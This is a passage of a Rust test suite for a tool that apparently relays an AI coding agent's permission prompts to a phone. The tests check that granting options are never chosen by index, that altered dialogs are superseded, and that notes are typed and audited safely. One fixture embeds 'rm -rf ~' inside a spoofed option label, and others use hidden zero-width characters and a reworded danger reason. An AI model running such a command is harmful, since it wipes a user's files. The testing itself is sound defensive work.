        resolved(rig.choose(&b, 2, &b.nonce).await),
        ApprovalOutcome::Superseded,
        "lost arrows never confirm"
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["down", "down"]})]
    );
}

#[tokio::test]
async fn rows_under_the_last_option_are_shown_and_reissue_when_they_change() {
    let mut rig = Rig::start(TTL).await;
    // Hand-built from the reconstructed Bash dialog, not captured: the last option's label
    // wrapped onto the row under it.
    let wrapped = |rest: &str| {
        BASH.replace(
            "   3. No, and tell Claude what to do differently (esc)\n",
            &format!("   3. No, and tell Claude what to do\n      {rest}\n"),
        )
    };
    rig.herdr.with(|h| h.text = wrapped("differently (esc)"));
    let a = rig.needed().await;
    assert_eq!(a.choices[2].label, "No, and tell Claude what to do");
    assert_eq!(a.choices[2].detail.as_deref(), Some("differently (esc)"));

    let other = "differently, then run rm -rf ~ (esc)";
    rig.herdr.with(|h| h.text = wrapped(other));
    rig.observe().await;
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Superseded }
            if approval_id == a.approval_id
    ));
    let Event::ApprovalNeeded { approval: b } = rig.event().await else {
        panic!("expected approval.needed");
    };
    assert_eq!(b.choices[2].detail.as_deref(), Some(other));

    // The same row a column left of the label is no longer shown as the option's text.
    rig.herdr
        .with(|h| h.text = wrapped(other).replace("      differently", "     differently"));
    rig.observe().await;
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Superseded }
            if approval_id == b.approval_id
    ));
    let Event::ApprovalNeeded { approval: c } = rig.event().await else {
        panic!("expected approval.needed");
    };
    assert_eq!(c.choices[2].detail, None);
    assert_ne!(c.approval_id, b.approval_id);
}

#[tokio::test]
async fn a_granting_option_is_never_chosen_by_index_beside_an_approval() {
    let mut rig = Rig::start(TTL).await;
    // Hand-built from the reconstructed Bash dialog, not captured: one option that reads as
    // no decision, then options that grant. Each menu offers no decision and lists its
    // options as choices. The first: a rule with a scope longer than a choice holds, and an
    // option that starts with `Yes` and reads as no decision. The others hold a rule that
    // reads as one only as the phone shows it: behind a format character, and split between
    // the last label and the row under it.
    let (head, _) = BASH.split_once(" ❯ 1. Yes\n").unwrap();
    let scope = format!("/Users/me/src/{}", "d".repeat(300));
    let menu = |options: &str| {
        format!("{head} ❯ 1. Review the command first\n{options}\n\n Esc to cancel\n")
    };
    let cut = menu(&format!(
        "   2. Yes, and don't ask again for rm commands in {scope}\n   3. Yes, and switch to auto mode"
    ));
    let hidden = menu("   2. \u{200b}Yes, and always allow access to src/");
    let split = menu("   2. Yes, and\n      don't ask again for rm commands in src/");
    for (text, granting) in [(&cut, 1), (&cut, 2), (&hidden, 1), (&split, 1)] {
        rig.herdr.with(|h| {
            h.text = text.clone();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        assert!(a.options.is_empty());
        assert!(a.choices[1].label.starts_with("Yes, and"));
        assert_eq!(
            code(rig.choose(&a, granting, &a.nonce).await),
            ErrorCode::InvalidParams
        );
        assert!(rig.mutations().is_empty());
    }

    let b = rig.needed().await;
    assert_eq!(
        resolved(rig.choose(&b, 0, &b.nonce).await),
        ApprovalOutcome::Chosen {
            choice: 0,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["enter"]})]
    );
}

#[tokio::test]
async fn a_screen_that_drifts_under_a_blocked_agent_reissues_quietly() {
    let mut rig = Rig::start(TTL).await;
    rig.transcript(&fresh(ASKED_MULTI.1));
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = ASKED_MULTI.0.into();
    });
    let a = rig.needed().await;
    assert_eq!((a.accepts_input, a.has_text_field), (true, false));

    rig.herdr.with(|h| h.text = move_cursor(&h.text, 1));
    rig.observe().await;
    rig.no_event();
    assert_eq!(rig.approvals.pending(), std::slice::from_ref(&a));

    rig.transcript(&asking(ASKS));
    rig.herdr.with(|h| h.text = QUESTION.into());
    rig.observe().await;
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Superseded }
            if approval_id == a.approval_id
    ));
    let Event::ApprovalNeeded { approval: b } = rig.event().await else {
        panic!("expected approval.needed");
    };
    assert_eq!((b.accepts_input, b.has_text_field), (true, true));
    assert_eq!(b.choices.len(), 3);

    rig.herdr.with(|h| h.text = PLAN.into());
    let c = rig.needed().await;
    assert_ne!(c.approval_id, b.approval_id);
    assert_eq!((c.accepts_input, c.has_text_field), (false, false));
    assert_eq!(
        rig.alerts(2).await.len(),
        1,
        "a rebuilt approval within 30 s does not alert again"
    );

    rig.herdr.with(|h| {
        h.text = QUESTION.into();
        set_status(h, "blocked");
    });
    rig.needed().await;
    assert_eq!(rig.alerts(2).await.len(), 2, "a new episode alerts");
    assert!(rig.mutations().is_empty());
}

fn yes() -> Authorized {
    Arc::new(|| true)
}

fn live(rig: &Rig) {
    rig.herdr.with(|h| h.text = BASH_LIVE.into());
}

#[tokio::test]
async fn a_note_is_typed_into_the_amend_field_then_enter() {
    let mut rig = Rig::start(TTL).await;
    live(&rig);
    let a = rig.needed().await;
    assert!(a.supports_note);
    assert_eq!(
        a.options,
        [Decision::Approve, Decision::ApproveAlways, Decision::Deny]
    );
    let alerts = rig.alerts(1).await;
    assert_eq!(
        open_context(&rig.notification_key, &alerts[0].1.payload),
        json!({"v": 1, "body": "Bash: touch probe2.txt\nCreate empty probe2.txt file"})
    );
    let note = "use a .tmp extension";
    let outcome = resolved(
        rig.decide_with_note(&a, Decision::Approve, note, yes())
            .await,
    );
    assert_eq!(
        outcome,
        ApprovalOutcome::Applied {
            decision: Decision::Approve,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["tab"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
    assert_eq!(
        rig.herdr.params("pane.send_text"),
        [json!({"pane_id": "w7:p1", "text": note})]
    );
    let audit = rig.audit();
    assert_eq!(
        audit[0]["result"],
        format!("approve with note: applied terminal={TERMINAL} keys=tab,enter")
    );
    assert!(
        !audit[0].to_string().contains(".tmp"),
        "the note is never logged"
    );

    rig.herdr.with(|h| {
        h.text = BASH_LIVE.into();
        set_status(h, "blocked");
    });
    let b = rig.needed().await;
    let outcome = resolved(
        rig.decide_with_note(&b, Decision::Deny, "run the tests first", yes())
            .await,
    );
    assert!(matches!(
        outcome,
        ApprovalOutcome::Applied {
            decision: Decision::Deny,
            ..
        }
    ));
    assert_eq!(
        rig.herdr.params("agent.send_keys")[2..],
        [
            json!({"target": "w7:p1", "keys": ["down", "down", "down"]}),
            json!({"target": "w7:p1", "keys": ["tab"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ],
        "Deny with a note goes by arrows, never Esc"
    );
    assert_eq!(
        rig.audit()[1]["result"],
        format!("deny with note: applied terminal={TERMINAL} keys=down,down,down,tab,enter")
    );

    // The Edit prompt has no Always allow option to keep reading as an approval once `Yes`
    // is the note.
    rig.herdr.with(|h| {
        h.rule = "generic_permission_prompt".into();
        h.text = EDIT.into();
        set_status(h, "blocked");
    });
    let c = rig.needed().await;
    assert_eq!(c.options, [Decision::Approve, Decision::Deny]);
    let outcome = resolved(
        rig.decide_with_note(&c, Decision::Approve, note, yes())
            .await,
    );
    assert!(matches!(
        outcome,
        ApprovalOutcome::Applied {
            decision: Decision::Approve,
            ..
        }
    ));
    assert_eq!(
        rig.audit()[2]["result"],
        format!("approve with note: applied terminal={TERMINAL} keys=tab,enter")
    );
}

#[tokio::test]
async fn a_note_that_does_not_land_is_never_confirmed() {
    let mut rig = Rig::start(TTL).await;
    live(&rig);
    rig.herdr.with(|h| h.tab_amends = false);
    let a = rig.needed().await;
    assert_eq!(
        resolved(
            rig.decide_with_note(&a, Decision::Approve, "use a .tmp extension", yes())
                .await
        ),
        ApprovalOutcome::Superseded
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["tab"]})],
        "no text, no Enter, no Esc"
    );
    assert!(rig.herdr.params("pane.send_text").is_empty());
    assert_eq!(
        rig.audit()[0]["result"],
        format!(
            "approve with note: superseded: amend field not shown terminal={TERMINAL} keys=tab"
        )
    );

    rig.herdr.with(|h| {
        h.text = BASH_LIVE.into();
        h.tab_amends = true;
        h.text_lands = false;
    });
    let b = rig.needed().await;
    assert_eq!(
        resolved(
            rig.decide_with_note(&b, Decision::Approve, "use a .tmp extension", yes())
                .await
        ),
        ApprovalOutcome::Superseded
    );
    assert_eq!(rig.herdr.params("pane.send_text").len(), 1);
    assert_eq!(
        rig.herdr.params("agent.send_keys")[1..],
        [json!({"target": "w7:p1", "keys": ["tab"]})],
        "no Enter, no Esc"
    );
    assert_eq!(
        rig.audit()[1]["result"],
        format!("approve with note: superseded: note not shown terminal={TERMINAL} keys=tab")
    );

    rig.herdr.with(|h| {
        h.text = BASH_LIVE.into();
        h.text_lands = true;
        h.tab_moves_on = true;
    });
    let c = rig.needed().await;
    assert_eq!(
        resolved(
            rig.decide_with_note(&c, Decision::Approve, "use a .tmp extension", yes())
                .await
        ),
        ApprovalOutcome::Superseded,
        "a new prompt under the field"
    );
    assert_eq!(rig.herdr.params("pane.send_text").len(), 1);
    assert_eq!(rig.herdr.params("agent.send_keys").len(), 3);
    assert_eq!(
        rig.herdr.with(|h| h.agent["agent_status"].clone()),
        "blocked"
    );
}

#[tokio::test]
async fn a_note_stops_when_the_reason_changes_under_it() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.text = RM_REASON.into();
        h.tab_rewords = Some(("Dangerous rm operation", "Routine cleanup"));
    });
    let a = rig.needed().await;
    assert!(a.supports_note);
    assert!(
        a.reason
            .as_deref()
            .is_some_and(|r| r.starts_with("Dangerous rm operation"))
    );
    assert_eq!(
        resolved(
            rig.decide_with_note(&a, Decision::Approve, "use a .tmp extension", yes())
                .await
        ),
        ApprovalOutcome::Superseded
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["tab"]})],
        "no text, no Enter, no Esc"
    );
    assert!(rig.herdr.params("pane.send_text").is_empty());
    let b = rig.needed().await;
    assert!(
        b.reason
            .as_deref()
            .is_some_and(|r| r.starts_with("Routine cleanup"))
    );
}

#[tokio::test]
async fn a_note_needs_authorization_before_every_write() {
    let mut rig = Rig::start(TTL).await;
    live(&rig);
    for (allowed, tabs, texts) in [(1, 0, 0), (2, 1, 0), (3, 1, 1)] {
        rig.herdr.with(|h| {
            h.text = BASH_LIVE.into();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        let before = (
            rig.herdr.params("agent.send_keys").len(),
            rig.herdr.params("pane.send_text").len(),
        );
        let checks = Arc::new(AtomicUsize::new(0));
        let seen = checks.clone();
        let auth: Authorized = Arc::new(move || seen.fetch_add(1, Ordering::SeqCst) < allowed);
        assert_eq!(
            code(
                rig.decide_with_note(&a, Decision::Approve, "use a .tmp extension", auth)
                    .await
            ),
            ErrorCode::NotPaired,
            "{allowed}"
        );
        assert_eq!(
            (
                rig.herdr.params("agent.send_keys").len() - before.0,
                rig.herdr.params("pane.send_text").len() - before.1,
            ),
            (tabs, texts),
            "{allowed}: never Enter"
        );
    }
}

#[tokio::test]
async fn a_note_is_refused_where_it_is_not_offered() {
    let mut rig = Rig::start(TTL).await;
    live(&rig);
    let a = rig.needed().await;
    assert_eq!(
        code(
            rig.decide_with_note(&a, Decision::ApproveAlways, "x", yes())
                .await
        ),
        ErrorCode::InvalidParams
    );
    rig.herdr.with(|h| {
        h.text = BASH_LIVE.replace(" · Tab to amend", "");
        set_status(h, "blocked");
    });
    let b = rig.needed().await;
    assert!(!b.supports_note);
    assert_eq!(
        code(
            rig.decide_with_note(&b, Decision::Approve, "x", yes())
                .await
        ),
        ErrorCode::InvalidParams
    );
    rig.transcript(&asking(ASKS));
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = QUESTION.into();
        set_status(h, "blocked");
    });
    let c = rig.needed().await;
    assert_eq!(c.choices.len(), 3);
    assert_eq!(
        code(rig.decide_with_note(&c, Decision::Deny, "x", yes()).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.mutations().is_empty());
    let results: Vec<Value> = rig.audit().iter().map(|e| e["result"].clone()).collect();
    assert_eq!(
        results,
        [
            "approve_always with note: rejected: note not offered",
            "approve with note: rejected: note not offered",
            "deny with note: rejected: decision not offered",
        ]
    );
}

#[tokio::test]
async fn a_plan_is_chosen_but_takes_no_note() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.rule = "legacy_no_prompt_blocker".into();
        h.text = PLAN_LIVE.into();
    });
    let a = rig.needed().await;
    assert!(a.options.is_empty());
    assert_eq!(
        (a.accepts_input, a.has_text_field, a.supports_note),
        (false, true, false)
    );
    assert_eq!(
        choice_labels(&a),
        [
            (0, "Yes, and use auto mode".to_owned(), true),
            (1, "Yes, manually approve edits".to_owned(), false),
            (2, "Tell Claude what to change".to_owned(), false),
        ]
    );
    assert!(matches!(
        resolved(rig.choose(&a, 1, &a.nonce).await),
        ApprovalOutcome::Chosen { choice: 1, .. }
    ));
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
}
